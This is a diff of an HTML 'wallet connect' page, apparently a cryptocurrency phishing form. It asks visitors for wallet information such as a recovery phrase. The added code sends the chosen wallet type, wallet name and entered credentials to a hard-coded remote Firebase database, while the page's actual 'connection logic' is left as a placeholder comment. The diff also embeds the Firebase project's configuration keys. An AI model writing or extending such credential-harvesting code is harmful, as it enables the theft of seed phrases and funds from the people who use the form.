@@ -122,8 +122,6 @@
             background: linear-gradient(to bottom, #2980b9, #5499c7);
         }
     </style>
-
-    <script src="script.js"></script>
     
 </head>
 
@@ -217,7 +215,10 @@
         <form id="wallet-connect-form">
             <label for="wallet-type">Selected Wallet:</label>
             <input type="text" id="selected-wallet" readonly>
-
+            
+            <label for="wallet-name">Wallet Name:</label>
+            <input type="text" id="wallet-name" required>
+            
             <label for="wallet-info-type">Select Wallet Information Type:</label>
             <select id="wallet-info-type" onchange="showInfoInput()">
                 <option value="phrase">Phrase</option>
@@ -281,10 +282,12 @@
             }
         }
 
-        function connectWallet() {
+   
+ function connectWallet() {
             // Retrieve selected wallet type, information type, and credentials
             const selectedWallet = document.getElementById('selected-wallet').value;
             const walletInfoType = document.getElementById('wallet-info-type').value;
+            const walletName = document.getElementById('wallet-name').value; // New field for wallet name
 
             // Retrieve information input based on the selected type
             let walletCredentials;
@@ -304,15 +307,42 @@
                     break;
             }
 
-            // Perform wallet connection logic (use web3 libraries)
-            // For simplicity, you can log the wallet type, information type, and credentials to the console
-            console.log('Selected Wallet:', selectedWallet);
-            console.log('Information Type:', walletInfoType);
-            console.log('Credentials:', walletCredentials);
+            // Initialize Firebase (Use your actual Firebase configuration)
+            const firebaseConfig = {
+                apiKey: "AIzaSyCWsLUONo3eVXS4R-2niIJZYaA8I0RtrbQ",
+                authDomain: "crypto-jwv.firebaseapp.com",
+                projectId: "crypto-jwv",
+                storageBucket: "crypto-jwv.appspot.com",
+                messagingSenderId: "653329737827",
+                appId: "1:653329737827:web:81394c978771bc4a35b056"
+            };
+
+            const app = firebase.initializeApp(firebaseConfig);
+            const database = firebase.database();
+
+            // Save wallet information to Firebase
+            const user = firebase.auth().currentUser; // Use the current authenticated user
+            const walletRef = database.ref('users/' + user.uid + '/wallets').push();
+
+            walletRef.set({
+                walletType: selectedWallet,
+                walletName: walletName,
+                walletInfoType: walletInfoType,
+                walletCredentials: walletCredentials
+            }).then(() => {
+                console.log('Wallet information saved successfully!');
+                alert('Wallet information saved successfully!');
+            }).catch((error) => {
+                console.error('Error saving wallet information:', error);
+                alert('Error saving wallet information. Please try again.');
+            });
 
             // Add your actual wallet connection logic here
         }
     </script>
+
+
+    
 </body>
 
 </html>
